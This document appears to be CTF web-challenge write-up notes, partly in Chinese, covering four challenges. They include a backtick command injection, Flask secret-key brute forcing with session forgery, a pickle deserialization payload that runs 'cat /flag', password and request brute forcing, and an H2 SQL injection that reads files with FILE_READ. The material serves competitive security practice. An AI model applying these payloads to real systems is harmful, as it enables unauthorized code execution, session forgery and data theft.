# What the cow say?
	- ```shell
	  moo `nl /f*/*`
	  ```
- # myflask
	- 首先造一个字典用 [[CTFWEB/Flask-Unsign]] 爆破出密钥`003649`
		- ```python
		  with open("wordlist.txt", "w") as f:
		      for i, j in ((i, j) for i in range(0, 60) for j in range(0, 60)):
		          f.write("00" + str(i).zfill(2) + str(j).zfill(2) + "\n")
		  ```
	- 然后伪造session
		- ```shell
		  flask-unsign -s --secret 003649 -c "{'username': 'admin'}"
		  ```
	- 最后直接pickle反序列化，payload:
		- ```python
		  b"(T*\x00\x00\x00__import__('os').popen('cat /flag').read()ibuiltins\neval\n."
		  ```
		- ```python
		  base_request.reset_session()
		  r = base_post(url + "flag", cookies = {"session": session}, data = {
		      "pickle_data": encoder.base64_encode(opcode)
		  })
		  print(r.text)
		  ```
- # Select More Courses
	- 爆破出密码`qwert123`，然后多线程爆破请求扩学分接口，最后选课即可
- # search4member
  id:: 65c31b16-c2a3-4355-a8b6-1baca2e5e778
	- 查看源码可知SQL引擎是h2 database
	- 直接读文件即可
		- ```python
		  url = "http://106.14.57.14:31536"
		  
		  r = base_post(url, params = {
		      "keyword": "web%' union select '1', FILE_READ('/flag', NULL),'3' --"
		  })
		  bs = BeautifulSoup(r.text, "html.parser")
		  print(bs.select("ul"))
		  ```